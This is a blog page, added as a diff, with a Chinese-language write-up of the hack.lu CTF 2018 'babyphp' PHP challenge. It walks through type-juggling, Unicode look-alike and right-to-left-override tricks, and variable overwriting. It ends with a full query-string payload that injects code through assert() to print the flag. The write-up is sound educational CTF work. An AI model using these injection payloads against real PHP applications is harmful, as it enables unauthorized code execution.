@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          hacklu_CTF2018 write up - 信息安全个人wiki&amp;blog
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>信息安全个人WIKI&amp;BLOG</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <ul>
+<li><a href="/">Home</a></li>
+<li><a href="/about">About</a></li>
+<li><a href="/note">Notes</a></li>
+</ul>
+<h1 id="web安全"><a href="#web安全" class="headerlink" title="web安全"></a><strong>web安全</strong></h1><h3 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h3><ul>
+<li><a href="/contents/xss">WebSecurity-xss</a></li>
+<li><a href="/contents/csrf">WebSecurity-csrf</a></li>
+<li><a href="/contents/ssrf">WebSecurity-ssrf</a></li>
+<li><a href="/contents/FI">WebSecurity-FI</a></li>
+<li><a href="/contents/rce">WebSecurity-rce</a></li>
+<li><a href="/contents/upload">WebSecurity-upload</a></li>
+<li><a href="/contents/xxe">WebSecurity-xxe</a></li>
+</ul>
+<h2 id="labs"><a href="#labs" class="headerlink" title="labs"></a>labs</h2><ul>
+<li><a href="/contents/xsslabs">xss-demo项目练习</a></li>
+<li><a href="/contents/sqllabs">sql-labs项目练习</a></li>
+<li><a href="/contents/uploadlabs">upload-labs系列write-up</a></li>
+<li><a href="/contents/code-breaking">code-breaking write-up</a></li>
+</ul>
+<h2 id="CTF-amp-AWD"><a href="#CTF-amp-AWD" class="headerlink" title="CTF&amp;AWD"></a>CTF&amp;AWD</h2><ul>
+<li><a href="/contents/awd">百越杯AWD攻防源码复现分析</a></li>
+<li><a href="/contents/jarvis">Jarvis oj web部分write-up</a></li>
+<li><a href="/contents/babyphp">hacklu_CTF2018 write up</a></li>
+<li><a href="/contents/suctf">suctf招新赛web全题解</a></li>
+<li><a href="/contents/shanghai">骇极杯CTF Write up</a></li>
+<li><a href="/contents/wangding">2018网鼎杯web部分write-up合集</a></li>
+</ul>
+<h2 id="实战-amp-总结"><a href="#实战-amp-总结" class="headerlink" title="实战&amp;总结"></a>实战&amp;总结</h2><ul>
+<li><a href="/contents/login">登录框渗透总结</a></li>
+<li><a href="/contents/logic">登录逻辑漏洞总结</a></li>
+<li><a href="/contents/unauthorized">未授权访问渗透总结</a></li>
+<li><a href="/contents/mysql-fileread">mysql客户端读取漏洞</a></li>
+</ul>
+<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a><strong>内网渗透</strong></h1><ul>
+<li>待补充</li>
+</ul>
+<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a><strong>代码审计</strong></h1><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><ul>
+<li><a href="/contents/variable">代码审计基础之变量覆盖漏洞</a></li>
+<li><a href="/contents/injection">代码审计基础之命令注入函数</a></li>
+<li><a href="/contents/serialize">代码审计基础之php反序列化</a></li>
+</ul>
+<h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><ul>
+<li>待补充</li>
+</ul>
+<h1 id="安全开发"><a href="#安全开发" class="headerlink" title="安全开发"></a><strong>安全开发</strong></h1><ul>
+<li><a href="/contents/tools">一些工具的使用命令</a></li>
+</ul>
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
+  <div class="sidebar-toggle-inner"></div>
+</div>
+
+<script>
+function add_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.add('show')  
+}
+
+function remove_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.remove('show')
+}
+
+function sidebar_toggle() {
+    let sidebar_toggle = document.querySelector('.sidebar-toggle')
+    let sidebar = document.querySelector('.book-sidebar')
+    let content = document.querySelector('.off-canvas-content')
+    if (sidebar_toggle.classList.contains('extend')) { // show
+        sidebar_toggle.classList.remove('extend')
+        sidebar.classList.remove('hide')
+        content.classList.remove('extend')
+    }
+    else { // hide
+        sidebar_toggle.classList.add('extend')
+        sidebar.classList.add('hide')
+        content.classList.add('extend')
+    }
+}
+</script>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <p>一道有意思的题<a id="more"></a> </p>
+<p>下午，队友在群里发了一个题，感觉挺有意思的。于是准备肝一下，没想到一肝就是好几个小时qaq还是太菜了，发篇博客记录一下</p>
+<p><img src="/img/babyphp_1.png" alt=""></p>
+<p>细看了一下，这道题大概有5-6个考点….这现在的web狗生存环境都这么差了么<strong>(／‵Д′)／~ ╧╧</strong> </p>
+<p>好吧，一个一个一个看，慢慢来不着急</p>
+<h2 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@$msg = $_GET[<span class="string">'msg'</span>];</span><br><span class="line"><span class="keyword">if</span>(@file_get_contents($msg)!==<span class="string">"Hello Challenge!"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Wow so rude!!!!1'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hello Hacker! Have a look around.\n"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>第一步很简单，只要利用<code>php://input</code>传值即可</p>
+<h2 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@$k1=$_GET[<span class="string">'key1'</span>];</span><br><span class="line">@$k2=$_GET[<span class="string">'key2'</span>];</span><br><span class="line"></span><br><span class="line">$cc = <span class="number">1337</span>;$bb = <span class="number">42</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(intval($k1) !== $cc || $k1 === $cc)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"lol no\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>emm，要求传入<code>k1</code>后并且转成整形后<code>k1</code>的值等于<code>cc</code>但是要求<code>cc</code>的值不等于<code>k1</code>的值</p>
+<p>不然就会<code>die</code>，这里我们可以用小数点绕过<code>key1=1337.1</code></p>
+<p>这时页面回显</p>
+<p><img src="/img/babyphp_2.png" alt=""></p>
+<p>可以看到我们已经绕过去了在<code>lelno</code>这里<code>die</code>了</p>
+<h2 id="step3"><a href="#step3" class="headerlink" title="step3"></a>step3</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strlen($k2) == $bb)&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/^\d+＄/'</span>, $k2) &amp;&amp; !is_numeric($k2))&#123;</span><br><span class="line">        <span class="keyword">if</span>($k2 == $cc)&#123;</span><br><span class="line">            @$cc = $_GET[<span class="string">'cc'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里由于页面无回显所以不好判断是否绕过，于是我们在本地搭了一个环境来进行测试</p>
+<p>大概的意思就是输入的<code>k2</code>的值的长度要为<code>42</code>，然后通过正则匹配<code>preg_match(&#39;/^\d+＄/&#39;, $k2)</code>并且<code>k2</code>的值不能为数字并且<code>cc</code>的值等于<code>k2</code>即可对<code>cc</code>进行传参</p>
+<p>乍看一眼这个正则匹配是要求为全部都是数字，看到这里我们都懵逼了，又是数字又不是数字的东西是什么？？是鬼吗？<strong>(／‵Д′)／~ ╧╧</strong> </p>
+<p>在这里卡了半天，一直没思路</p>
+<p><img src="/img/babyphp_3.png" alt=""></p>
+<p>后来把他复制到<code>bp</code>里面发现这竟然是个不可见字符？？emm</p>
+<p>原来这不是正常的<code>$</code>符，wtf！！！</p>
+<p>那么就是只要这个字符结尾，数字开头即可，构造到如下<code>payload</code></p>
+<p><code>key2=000000000000000000000000000000000001337＄&amp;cc[]=123</code></p>
+<p>本地测试已经进入了第二个<code>if</code>然后数组绕过<code>==</code>那么我们给<code>cc</code>赋值了<code>123</code></p>
+<h2 id="step4"><a href="#step4" class="headerlink" title="step4"></a>step4</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">list</span>($k1,$k2) = [$k2, $k1];</span><br><span class="line"><span class="keyword">if</span>(substr($cc, $bb) === sha1($cc))&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $lel =&gt; $hack)&#123;</span><br><span class="line">        $$lel = $hack;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$‮b = <span class="string">"2"</span>;$a=<span class="string">"‮b"</span>;<span class="comment">//;1=b</span></span><br><span class="line"><span class="keyword">if</span>($$a !== $k1)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"lel no\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>k1</code>和<code>k2</code>经过<code>list</code>后进行了交换，然后经过<code>foreach</code>和后面的语句进行变量覆盖</p>
+<p>但是要注意这里有个巨tm坑的点</p>
+<p><img src="/img/babyphp_4.png" alt=""></p>
+<p>也不知道主办方用了什么招，这一句话竟然tm是反过来的？？？</p>
+<p>也就是说这句代码其实是<code>$b=&quot;2&quot;;$a=&quot;b&quot;;//b=1;</code>即<code>$$a=$b=2</code></p>
+<p>那这样我们就可以结合前面的变量覆盖来给<code>k1</code>赋值从而绕过<code>lel no</code></p>
+<p><code>$lel=k1，$k1=2, $$lel==&gt;$k1==&gt;2</code> </p>
+<h2 id="step5"><a href="#step5" class="headerlink" title="step5"></a>step5</h2><p>前面的都绕过了，剩一个<code>rce</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">assert_options(ASSERT_BAIL, <span class="number">1</span>);</span><br><span class="line">assert(<span class="string">"$bb == $cc"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Good Job ;)"</span>;</span><br><span class="line"><span class="comment">// TODO</span></span><br><span class="line"><span class="comment">// echo $flag;</span></span><br></pre></td></tr></table></figure>
+
+<p>刚开始一直想着用<code>cc</code>的值来<code>rce</code>可能是因为数组的原因一直失败，后来脑洞大开，直接通过前面的<code>foreach</code>给<code>bb</code>传入命令然后注释掉后面的即可</p>
+<p><code>bb=print_r($flag);%23</code>成功getflag</p>
+<p>nice！</p>
+<h2 id="end"><a href="#end" class="headerlink" title="end"></a>end</h2><p>这道题说实话学到的还是挺多的，中途的调试也学到了很多姿势，最后接出来也挺开心的</p>
+<p>最后贴一下<code>payload</code>和图</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?msg&#x3D;php:&#x2F;&#x2F;input&amp;key1&#x3D;1337.1&amp;key2&#x3D;000000000000000000000000000000000001337＄&amp;cc[]&#x3D;123&amp;k1&#x3D;2&amp;bb&#x3D;print_r($flag);%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/babyphp_5.png" alt=""></p>
+
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure class="avatar avatar-lg">
+          <img src="/avater.jpg" alt="...">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>comical</div>
+      <div>2018-10-17</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/ctf-awd/">ctf+awd</a>
+
+      <a class="tag-link" href="/tags/ctf/" rel="tag">#ctf</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
